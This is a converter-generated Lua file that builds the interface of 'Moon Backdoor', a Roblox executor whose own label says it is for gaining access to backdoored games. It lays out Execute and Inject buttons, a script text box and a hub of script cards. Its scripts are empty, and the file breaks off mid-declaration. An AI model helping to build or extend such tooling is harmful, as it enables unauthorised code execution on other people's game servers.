--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 125 | Scripts: 23 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Load
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(219, 103, 36);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Load]];
G2L["2"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Load.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Load.bg
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["ZIndex"] = 10000000;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["ImageColor3"] = Color3.fromRGB(219, 103, 36);
G2L["4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["4"]["Image"] = [[rbxassetid://992001116]];
G2L["4"]["Size"] = UDim2.new(1.41, 0, 1, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 0.4;
G2L["4"]["Name"] = [[bg]];
G2L["4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.bg.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.ScreenGui.Load.Logo
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["ZIndex"] = 10000000;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["ImageColor3"] = Color3.fromRGB(219, 103, 36);
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Image"] = [[rbxassetid://73958241564252]];
G2L["6"]["Size"] = UDim2.new(0, 109, 0, 133);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 0.4;
G2L["6"]["Name"] = [[Logo]];
G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["9"] = Instance.new("UIAspectRatioConstraint", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UICorner
G2L["a"] = Instance.new("UICorner", G2L["6"]);
G2L["a"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.ScreenGui.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.ScreenGui.Main
G2L["c"] = Instance.new("Frame", G2L["1"]);
G2L["c"]["Visible"] = false;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["c"]["Size"] = UDim2.new(0, 560, 0, 333);
G2L["c"]["Position"] = UDim2.new(0.23054, 0, 0.22432, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.RE
G2L["d"] = Instance.new("TextButton", G2L["c"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 20;
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d"]["ZIndex"] = 1000000000;
G2L["d"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[RE]];
G2L["d"]["Name"] = [[RE]];
G2L["d"]["Position"] = UDim2.new(0.22879, 0, 0.03594, 0);


-- StarterGui.ScreenGui.Main.RE.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["d"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["f"] = Instance.new("TextLabel", G2L["c"]);
G2L["f"]["ZIndex"] = 1000000000;
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 20;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Size"] = UDim2.new(0, 58, 0, 52);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[🔴]];
G2L["f"]["Name"] = [[Stats]];
G2L["f"]["Position"] = UDim2.new(0.90407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["10"] = Instance.new("UIAspectRatioConstraint", G2L["f"]);



-- StarterGui.ScreenGui.Main.Extrot
G2L["11"] = Instance.new("Frame", G2L["c"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["11"]["Size"] = UDim2.new(0, 413, 0, 264);
G2L["11"]["Position"] = UDim2.new(0.2297, 0, 0.14715, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Name"] = [[Extrot]];


-- StarterGui.ScreenGui.Main.Extrot.LocalScript
G2L["12"] = Instance.new("LocalScript", G2L["11"]);



-- StarterGui.ScreenGui.Main.Extrot.btns
G2L["13"] = Instance.new("Frame", G2L["11"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["13"]["Size"] = UDim2.new(0, 399, 0, 48);
G2L["13"]["Position"] = UDim2.new(0.01646, 0, 0.80714, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[btns]];


-- StarterGui.ScreenGui.Main.Extrot.btns.UIListLayout
G2L["14"] = Instance.new("UIListLayout", G2L["13"]);
G2L["14"]["Padding"] = UDim.new(0, 5);
G2L["14"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["14"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["14"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Extrot.btns.Execute
G2L["15"] = Instance.new("TextButton", G2L["13"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 18;
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15"]["Size"] = UDim2.new(0, 112, 0, 38);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Execute]];
G2L["15"]["Name"] = [[Execute]];
G2L["15"]["Position"] = UDim2.new(0, 0, 0.20833, 0);


-- StarterGui.ScreenGui.Main.Extrot.btns.Clear
G2L["16"] = Instance.new("TextButton", G2L["13"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 18;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 112, 0, 38);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Clear]];
G2L["16"]["Name"] = [[Clear]];
G2L["16"]["Position"] = UDim2.new(0.29323, 0, 0.20833, 0);


-- StarterGui.ScreenGui.Main.Extrot.btns.Inject
G2L["17"] = Instance.new("TextButton", G2L["13"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 18;
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17"]["Size"] = UDim2.new(0, 112, 0, 38);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[Inject]];
G2L["17"]["Name"] = [[Inject]];
G2L["17"]["Position"] = UDim2.new(0.58647, 0, 0.20833, 0);


-- StarterGui.ScreenGui.Main.Extrot.btns.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.ScreenGui.Main.Extrot.ScrollingFrame
G2L["19"] = Instance.new("ScrollingFrame", G2L["11"]);
G2L["19"]["Active"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["19"]["CanvasPosition"] = Vector2.new(0, 443.08322);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["Size"] = UDim2.new(0, 413, 0, 204);
G2L["19"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Extrot.ScrollingFrame.UIListLayout
G2L["1a"] = Instance.new("UIListLayout", G2L["19"]);
G2L["1a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Main.Extrot.ScrollingFrame.TextBox
G2L["1b"] = Instance.new("TextBox", G2L["19"]);
G2L["1b"]["ClearTextOnFocus"] = false;
G2L["1b"]["MultiLine"] = true;
G2L["1b"]["CursorPosition"] = -1;
G2L["1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1b"]["PlaceholderColor3"] = Color3.fromRGB(233, 118, 36);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["TextSize"] = 22;
G2L["1b"]["TextColor3"] = Color3.fromRGB(233, 233, 233);
G2L["1b"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["PlaceholderText"] = [[print("Moon Backdoor!")]];
G2L["1b"]["Size"] = UDim2.new(0, 397, 0, 1020);
G2L["1b"]["Position"] = UDim2.new(0, 0, -0.8, 0);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[]];
G2L["1b"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Logo
G2L["1c"] = Instance.new("ImageLabel", G2L["c"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1c"]["ImageColor3"] = Color3.fromRGB(255, 129, 39);
G2L["1c"]["Image"] = [[rbxassetid://73958241564252]];
G2L["1c"]["Size"] = UDim2.new(0, 54, 0, 66);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Name"] = [[Logo]];
G2L["1c"]["Position"] = UDim2.new(0.06964, 0, 0.05405, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1d"] = Instance.new("UIAspectRatioConstraint", G2L["1c"]);



-- StarterGui.ScreenGui.Main.Logo.TextLabel
G2L["1e"] = Instance.new("TextLabel", G2L["1c"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 18;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1e"]["TextColor3"] = Color3.fromRGB(233, 118, 36);
G2L["1e"]["BackgroundTransparency"] = 1;
G2L["1e"]["Size"] = UDim2.new(-1.88889, 200, -0.04, 50);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Moon]];
G2L["1e"]["Position"] = UDim2.new(-0.40741, 0, 0.77778, 0);


-- StarterGui.ScreenGui.Main.Logo.TextLabel
G2L["1f"] = Instance.new("TextLabel", G2L["1c"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 18;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(-1.88889, 200, -0.04, 50);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Backdoor]];
G2L["1f"]["Position"] = UDim2.new(-0.40741, 0, 1.28926, 0);


-- StarterGui.ScreenGui.Main.btns
G2L["20"] = Instance.new("Frame", G2L["c"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["20"]["Size"] = UDim2.new(0, 100, 0, 177);
G2L["20"]["Position"] = UDim2.new(0.02857, 0, 0.40805, 0);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Name"] = [[btns]];


-- StarterGui.ScreenGui.Main.btns.UIListLayout
G2L["21"] = Instance.new("UIListLayout", G2L["20"]);
G2L["21"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["21"]["Padding"] = UDim.new(0, 5);
G2L["21"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["21"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Main.btns.Exe
G2L["22"] = Instance.new("TextButton", G2L["20"]);
G2L["22"]["TextWrapped"] = true;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextSize"] = 18;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["22"]["Size"] = UDim2.new(0, 80, 0, 49);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Executor]];
G2L["22"]["Name"] = [[Exe]];
G2L["22"]["Position"] = UDim2.new(0.1, 0, 0.69923, 0);


-- StarterGui.ScreenGui.Main.btns.LocalScript
G2L["23"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.ScreenGui.Main.btns.Hub
G2L["24"] = Instance.new("TextButton", G2L["20"]);
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["TextSize"] = 18;
G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["24"]["Size"] = UDim2.new(0, 80, 0, 49);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Text"] = [[Hub]];
G2L["24"]["Name"] = [[Hub]];
G2L["24"]["Position"] = UDim2.new(0.1, 0, 0.69923, 0);


-- StarterGui.ScreenGui.Main.btns.Admin
G2L["25"] = Instance.new("TextButton", G2L["20"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 18;
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/HighwayGothic.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["25"]["Size"] = UDim2.new(0, 80, 0, 49);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Info]];
G2L["25"]["Name"] = [[Admin]];
G2L["25"]["Position"] = UDim2.new(0.1, 0, 0.69923, 0);


-- StarterGui.ScreenGui.Main.btns.LocalScript
G2L["26"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.ScreenGui.Main.UIDrag
G2L["27"] = Instance.new("LocalScript", G2L["c"]);
G2L["27"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.Admin
G2L["28"] = Instance.new("Frame", G2L["c"]);
G2L["28"]["Visible"] = false;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["28"]["Size"] = UDim2.new(0, 413, 0, 264);
G2L["28"]["Position"] = UDim2.new(0.2297, 0, 0.14715, 0);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Name"] = [[Admin]];


-- StarterGui.ScreenGui.Main.Admin.Gamename
G2L["29"] = Instance.new("TextLabel", G2L["28"]);
G2L["29"]["TextWrapped"] = true;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 15;
G2L["29"]["TextScaled"] = true;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundTransparency"] = 1;
G2L["29"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["29"]["Size"] = UDim2.new(0.44744, 200, 0.69566, 50);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[this executor was made by g4mg_99 to gain access on backdoored games also please make sure to join our server !]];
G2L["29"]["Name"] = [[Gamename]];
G2L["29"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Main.Hub
G2L["2a"] = Instance.new("Frame", G2L["c"]);
G2L["2a"]["Visible"] = false;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["2a"]["Size"] = UDim2.new(0, 413, 0, 264);
G2L["2a"]["Position"] = UDim2.new(0.2297, 0, 0.14715, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Name"] = [[Hub]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame
G2L["2b"] = Instance.new("ScrollingFrame", G2L["2a"]);
G2L["2b"]["Active"] = true;
G2L["2b"]["ZIndex"] = 1000000000;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["Size"] = UDim2.new(-0.29087, 505, -0.07765, 259);
G2L["2b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Position"] = UDim2.new(-0.10638, 0, 0.08712, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.UIPadding
G2L["2c"] = Instance.new("UIPadding", G2L["2b"]);
G2L["2c"]["PaddingTop"] = UDim.new(0, 5);
G2L["2c"]["PaddingLeft"] = UDim.new(0, 8);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.UIListLayout
G2L["2d"] = Instance.new("UIListLayout", G2L["2b"]);
G2L["2d"]["Wraps"] = true;
G2L["2d"]["Padding"] = UDim.new(0, 6);
G2L["2d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2d"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["2e"] = Instance.new("Frame", G2L["2b"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["2e"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["2e"]["Position"] = UDim2.new(-0, 0, -0.00196, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["2f"] = Instance.new("UIStroke", G2L["2e"]);
G2L["2f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2f"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
G2L["2f"]["Thickness"] = 1.3;
G2L["2f"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["30"] = Instance.new("ImageLabel", G2L["2e"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["30"]["Image"] = [[rbxassetid://114500437382056]];
G2L["30"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["BackgroundTransparency"] = 1;
G2L["30"]["Position"] = UDim2.new(-0, 0, -0.01464, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["31"] = Instance.new("UIGradient", G2L["30"]);
G2L["31"]["Rotation"] = 90;
G2L["31"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["32"] = Instance.new("TextButton", G2L["2e"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextSize"] = 22;
G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Text"] = [[Execute]];
G2L["32"]["Position"] = UDim2.new(0.09054, 0, 0.75833, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["33"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["34"] = Instance.new("TextLabel", G2L["2e"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["TextSize"] = 32;
G2L["34"]["TextTransparency"] = 0.49;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundTransparency"] = 1;
G2L["34"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Text"] = [[Goner]];
G2L["34"]["Position"] = UDim2.new(0.12029, 0, 0.05029, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
G2L["35"] = Instance.new("Frame", G2L["2b"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["35"]["Size"] = UDim2.new(0, 174, 0, 176);
G2L["35"]["Position"] = UDim2.new(0.48071, 0, -0.00196, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["36"] = Instance.new("UIStroke", G2L["35"]);
G2L["36"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["36"]["Thickness"] = 1.3;
G2L["36"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["37"] = Instance.new("ImageLabel", G2L["35"]);
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["37"]["Image"] = [[rbxassetid://72792773278885]];
G2L["37"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["BackgroundTransparency"] = 1;
G2L["37"]["Position"] = UDim2.new(0.0067, 0, -0.01464, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["38"] = Instance.new("UIGradient", G2L["37"]);
G2L["38"]["Rotation"] = 90;
G2L["38"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["39"] = Instance.new("TextButton", G2L["35"]);
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 22;
G2L["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[Execute]];
G2L["39"]["Position"] = UDim2.new(0.09724, 0, 0.75833, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["3a"] = Instance.new("LocalScript", G2L["39"]);



-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["3b"] = Instance.new("TextLabel", G2L["35"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 32;
G2L["3b"]["TextTransparency"] = 0.49;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[infinte yield]];
G2L["3b"]["Position"] = UDim2.new(0.12699, 0, 0.05029, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just
